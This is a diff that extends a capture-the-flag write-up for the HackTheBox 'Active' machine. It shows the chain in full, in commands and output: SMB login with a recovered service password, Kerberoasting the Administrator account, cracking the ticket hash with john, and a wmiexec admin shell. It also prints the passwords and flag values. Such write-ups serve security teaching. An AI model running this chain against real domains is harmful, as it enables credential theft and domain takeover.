@@ -96,6 +96,48 @@ GPPstillStandingStrong2k18
 
 Credentials as SVC_TGS : GPPstillStandingStrong2k18
 
+└─# smbclient //10.10.10.100/Users -U 'svc_tgs'
+Enter WORKGROUP\svc_tgs's password: GPPstillStandingStrong2k18
+smb: \SVC_TGS\Desktop\> get user.txt
+└─# cat user.txt 
+86d67d8ba232bb6a254aa4d10159e983
+
+
+└─# python GetADUsers.py -all active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
+Name                  Email                           PasswordLastSet      LastLogon           
+--------------------  ------------------------------  -------------------  -------------------
+Administrator                                         2018-07-18 22:06:40.351723  2021-01-21 19:07:03.723783 
+Guest                                                 <never>              <never>             
+krbtgt                                                2018-07-18 21:50:36.972031  <never>             
+SVC_TGS                                               2018-07-18 23:14:38.402764  2018-07-21 17:01:30.320277
+
+I proceed to perform Kerberoasting:
+└─# python GetUserSPNs.py active.htb/svc_tgs:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
+Impacket v0.9.23.dev1+20210504.123629.24a0ae6f - Copyright 2020 SecureAuth Corporation
+
+ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
+--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
+active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 22:06:40.351723  2021-01-21 19:07:03.723783             
+
+
+
+$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$ab82554b56b8946b258bd5ef44e2fab5$08cb610595a7bc7bf4d5efde52765409419f10d078201a27bb4ef86fe7071e2214a7b9bd975a2bfa9c59139eec9d96df3ccda2a9e026942781853121ec38fcb496819ac371543f6af5a698d7645feedcc0c9dbec17bd75cccf3781fefd8430e3e89de57130dff96295a506b590998893206c91ddd0b5791f5e71d8dcc0aabf3d243951bda676ce44ab18e548a824bde246b1d52413bc8a443c2413f3f1da5daf02e16469d2ced55fa1194b79c6426a7a662ab96629107882fac9db00034759c9a8da1b55ef762ca7439f6b7f0f4e81326d3ff457271100318f64c6ae358ee107afd5471c2ac860efd50c35f5a0c2e2a96f0f4f0796c7c0ddc01d3361a907b39746a82f1f965998b89dc7b5540cc694a00f944b09a6334c33d22d55cdb00dae4a24dc43135878c19ac6371169b82822fd8b40ab975f8f9553234c7ee930914935cc68d9f415c9ff2804fb6ac1c3457166d47700fc137845769783dabb07a435c0485302aea03b2c90f47173d193f4d0e63ea10f83035ba14b6ee4f475416372273cbaba314e4d21d81cff95809c0f18cb10600422a69f65eee2f8b33aafe162ad7da84c4a7d19d405e29c26e64900593520bcbf8f22a5518a1e691d14debc9a296fc655fe6fa5025d3b0aa62d84bdc1a15a464c7ff785e4175fb25a515ad323d1a28bb14fa1a687d39c83e3d85c543e98a091674edcbe41a7a4fedbbf753ddcbc41c48e90efc37d29fbb1ef99580eb8253f880364479b84ff8abe5de04fc6393182443fc07527af1c871165bb76c41de432df8ed1d7ced93867c274c9fa5e5fe4c810199ebe9a2070fe35c37db30b5d2f8e5bd10263424e193cca2fafe542bea5aaf57f294698b2be0cdb94e51860396264a576b8bc883f4996bc90e1145ee6121a87103cfdf1f1f8db9682392220d7863765d38d5d86cf753ac92cf5122b89a7fe7ad2c96e4bc721d3d7f9aa0559720116b6b43358a7a102a1996f041756402cc74b19dc04ba6da82eae1abbb9255400ea753b67eea0df665621c325be4bf6540a4ddb083a90ebac99b0784e86dfa3aedefc1560502f2c835304e65773d989133269bda04a2194f920ebe8f9bf56655f61be03ffcb40b38831e4e206d822a4cf4aca8d4e3f3ecd0b19b7d589bb28a9f2670eca1d5c321582d62e771931b828bfeb5c1c00a3fe8596ad7add3c206dec645fb6ebf9e170ea263680b0206c71c3d8d0a9eadc7131594a335b48c8fea8a9701493dec0809ff6151a49
+
+└─# john --wordlist=/usr/share/wordlists/rockyou.txt --format=krb5tgs admin.hash 
+Ticketmaster1968 (?)
+
+Now on to test the creds with crackmapexec
+└─# python wmiexec.py active.htb/administrator:Ticketmaster1968@10.10.10.100
+C:\>whoami
+active\administrator
+
+
+C:\>cd Users
+C:\Users>cd Administrator/Desktop
+C:\Users\Administrator\Desktop>dir
+21/07/2018  06:06 ��                34 root.txt
+C:\Users\Administrator\Desktop>type root.txt
+b5fc76d1d6b91d77b2fbf2d54d0f708b
 
 Reference:
 https://lanzt.github.io/blog/htb/HackTheBox-Active
